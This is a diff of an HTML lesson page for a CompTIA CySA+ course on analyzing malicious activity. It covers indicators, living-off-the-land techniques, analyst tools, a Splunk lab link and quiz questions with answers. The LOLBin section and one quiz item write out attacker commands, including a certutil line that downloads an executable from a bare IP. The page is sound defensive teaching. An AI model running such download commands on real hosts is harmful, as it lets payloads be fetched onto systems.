@@ -2,29 +2,121 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Lesson 10: Applying Tools to Identify Malicious Activity</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Lesson 10: Analyzing Malicious Activity</title>
   <link rel="stylesheet" href="../styles.css" />
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" />
+  <link rel="stylesheet" href="../../interactive.css">
+  <script src="../../interactive.js" defer></script>
+  <style>
+    .cmp { width: 100%; border-collapse: collapse; margin: 12px 0; font-size: 0.95rem; }
+    .cmp th, .cmp td { border: 1px solid #d1d5db; padding: 6px 8px; text-align: left; vertical-align: top; }
+    .cmp th { background: #f3f4f6; }
+    pre code { background: none; padding: 0; }
+  </style>
 </head>
 <body>
   <div class="slide-container">
     <div class="slide-header">
-      <h1>Lesson 10: Applying Tools to Identify Malicious Activity</h1>
-      <h2>CompTIA CySA+</h2>
+      <h1>Lesson 10: Analyzing Malicious Activity</h1>
+      <h2>CompTIA CySA+ (CS0-004)</h2>
     </div>
 
     <div class="section">
+      <h3>Overview</h3>
+      <p>This lesson is the core analyst skill: looking at network traffic, hosts, applications, cloud accounts and email, recognising what is malicious, and using the right tool to confirm it.</p>
+      <p>You will learn:</p>
+      <ul>
+        <li>network, host, application, cloud, identity and email indicators of malicious activity;</li>
+        <li>living-off-the-land attacks that abuse built-in tools;</li>
+        <li>the analyst toolbox: packet analysis, SIEM, EDR, reputation lookups, file analysis and sandboxes.</li>
+      </ul>
+      <p>On the exam this is mostly objectives 1.2 (indicators of potential malicious activity) and 1.3 (tools to determine malicious activity).</p>
+    </div>
+
+    <div class="section">
+      <h3>Step 1: CertMaster</h3>
       <div class="certmaster-card">
-        <h2>Next: CompTIA CySA+, Lesson 10</h2>
-        <p>Open CertMaster Learn in a new tab and complete <strong>Lesson 10</strong>, including its practice questions. Then come back here and continue.</p>
+        <h2>CompTIA CySA+, Lesson 10</h2>
+        <p>Open CertMaster Learn in a new tab and complete <strong>Lesson 10: Analyzing Malicious Activity</strong>, including its practice questions. Then come back here for the lab.</p>
         <p><a class="btn-primary" href="https://login.comptia.org/" target="_blank" rel="noopener">Sign in to CompTIA</a></p>
         <p class="certmaster-tip"><em>First time?</em> After you sign in and open your CySA+ course, bookmark that page (Ctrl+D, or Cmd+D on a Mac) so you can go straight back to it next time.</p>
       </div>
     </div>
 
     <div class="section">
-      <h3>Overview</h3>
-      <p>This lesson covers the tools and techniques used to identify malicious activity across network, endpoint, and cloud environments. Topics include SIEM log analysis, packet capture and analysis (Wireshark, tcpdump), endpoint detection and response (EDR) tools, network traffic analysis (Zeek, Snort), email header analysis, DNS query analysis, and sandbox detonation. You will learn to correlate data across multiple sources to build a complete picture of malicious activity.</p>
+      <h3>Step 2: Hands-on lab</h3>
+      <div class="lab-card">
+        <p class="lab-kicker">TryHackMe lab &middot; about 30 minutes</p>
+        <h4>Splunk: The Basics</h4>
+        <p>Use Splunk, one of the most common SIEMs, to search logs and investigate activity the way SOC analysts do.</p>
+        <p><a class="btn-primary" href="https://tryhackme.com/room/splunk101" target="_blank" rel="noopener">Open the lab on TryHackMe</a></p>
+        <p><strong>Done when:</strong> every task is answered and the room shows 100%. Sign in with your TryHackMe account; the lab opens in a new tab.</p>
+        <p class="lab-more"><strong>Want more practice? (optional)</strong> <a href="https://tryhackme.com/room/phishingemails3tryoe" target="_blank" rel="noopener">Phishing Analysis Tools</a> (investigating suspicious emails) &middot; <a href="https://tryhackme.com/room/livingoffthelandattacks" target="_blank" rel="noopener">Living Off the Land Attacks</a> (detecting attacks that abuse trusted Windows tools).</p>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>Step 3: Key ideas to remember</h3>
+
+      <h4>Indicators to recognise</h4>
+      <table class="cmp">
+        <tr><th>Where</th><th>Indicators</th></tr>
+        <tr><td>Network</td><td>Rogue devices, scanning and enumeration, regular "beaconing" to one outside address, traffic on unexpected ports, large outbound transfers</td></tr>
+        <tr><td>Host</td><td>High CPU or memory use, unauthorized software, suspicious or misnamed processes, new scheduled tasks or services, file system changes, unauthorized configuration changes</td></tr>
+        <tr><td>Application</td><td>Service crashes or outages, unusual errors, new accounts inside the app</td></tr>
+        <tr><td>Cloud</td><td>Unexpected new resources (often cryptomining), unusual API calls, settings changed to public</td></tr>
+        <tr><td>Social engineering</td><td>Typosquatted domains (<code>micros0ft.com</code>), shortened URLs hiding the real destination</td></tr>
+        <tr><td>Identity and email</td><td>Impossible travel, account compromise, business email compromise (BEC): a convincing request to change bank details or pay an invoice, often with no malware at all</td></tr>
+      </table>
+
+      <h4>Living off the land</h4>
+      <p>Attackers use tools already on the system so nothing new is installed: <code>powershell.exe -enc</code> (an encoded command), <code>certutil -urlcache</code> to download files, <code>rundll32</code>, <code>wmic</code>, scheduled tasks. These are LOLBins (living-off-the-land binaries). Spot them by <em>how</em> they are used and by unusual parent processes, for example Word starting PowerShell.</p>
+
+      <h4>The analyst toolbox</h4>
+      <ul>
+        <li><strong>Packet analysis:</strong> Wireshark, tcpdump, Zeek; intrusion detection with Snort and Suricata.</li>
+        <li><strong>Log analysis:</strong> the SIEM (Splunk, Elastic). <strong>Endpoint:</strong> EDR and XDR, and MDM for mobile devices.</li>
+        <li><strong>Reputation and intelligence:</strong> WHOIS, AbuseIPDB, IP geolocation, VirusTotal, threat-intelligence platforms (OTX, MISP, OpenCTI).</li>
+        <li><strong>File analysis:</strong> <code>strings</code>, YARA rules, sandboxes (Joe Sandbox, Cuckoo) that run the file safely and record what it does.</li>
+        <li><strong>Email:</strong> header analysis and MXToolbox (check SPF, DKIM and DMARC results and the real sending server). <strong>User behaviour:</strong> UEBA spots accounts acting unlike themselves.</li>
+      </ul>
+    </div>
+
+    <div class="section">
+      <h3>Check your understanding</h3>
+
+      <div class="check" data-answer="2">
+        <p class="check-q">EDR shows <code>certutil.exe -urlcache -f http://203.0.113.5/a.exe</code>. What is happening?</p>
+        <div class="check-options">
+          <button type="button">A normal certificate update</button>
+          <button type="button">Windows Update downloading a patch</button>
+          <button type="button">A built-in tool being abused to download a file (living off the land)</button>
+          <button type="button">An antivirus scan</button>
+        </div>
+        <p class="check-why">Certutil is a legitimate certificate tool, but downloading an executable from a bare IP address is a classic LOLBin technique.</p>
+      </div>
+
+      <div class="check" data-answer="0">
+        <p class="check-q">The CFO receives an email, apparently from the CEO, urgently asking for a wire transfer. It has no attachment or link. What is the likely attack?</p>
+        <div class="check-options">
+          <button type="button">Business email compromise (BEC)</button>
+          <button type="button">Ransomware</button>
+          <button type="button">SQL injection</button>
+          <button type="button">Typosquatting of a web page</button>
+        </div>
+        <p class="check-why">BEC relies on impersonation and urgency, not malware. Check the headers and reply-to address, and confirm the request by phone.</p>
+      </div>
+
+      <div class="check" data-answer="3">
+        <p class="check-q">You need to check whether an unknown file is known malware without running it on your workstation. What is a good first step?</p>
+        <div class="check-options">
+          <button type="button">Open it to see what it does</button>
+          <button type="button">Email it to colleagues for their opinion</button>
+          <button type="button">Delete it immediately</button>
+          <button type="button">Look up its hash on VirusTotal</button>
+        </div>
+        <p class="check-why">A hash lookup reveals known-bad files without sharing the file's contents. Unknown files can then go to a sandbox. Don't upload sensitive company documents to public services.</p>
+      </div>
     </div>
 
     <div class="slide-footer">
@@ -32,21 +124,16 @@
     </div>
   </div>
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-jsx.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-css.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
-
   <script src="https://vschool-reports.netlify.app/ltp.js"
     data-api="https://vschool-reports.netlify.app"
     data-lesson-id="L6-CYSA-010"
-    data-lesson-title="Applying Tools to Identify Malicious Activity"
+    data-lesson-title="Analyzing Malicious Activity"
     data-course-id="CompTIA CySA+">
   </script>
   <script src="https://vschool-reports.netlify.app/feedback.js"
     data-api="https://vschool-reports.netlify.app"
     data-lesson-id="L6-CYSA-010"
-    data-lesson-title="Applying Tools to Identify Malicious Activity"
+    data-lesson-title="Analyzing Malicious Activity"
     data-course-id="CompTIA CySA+"
     data-button-selector="#myFeedbackBtn">
   </script>
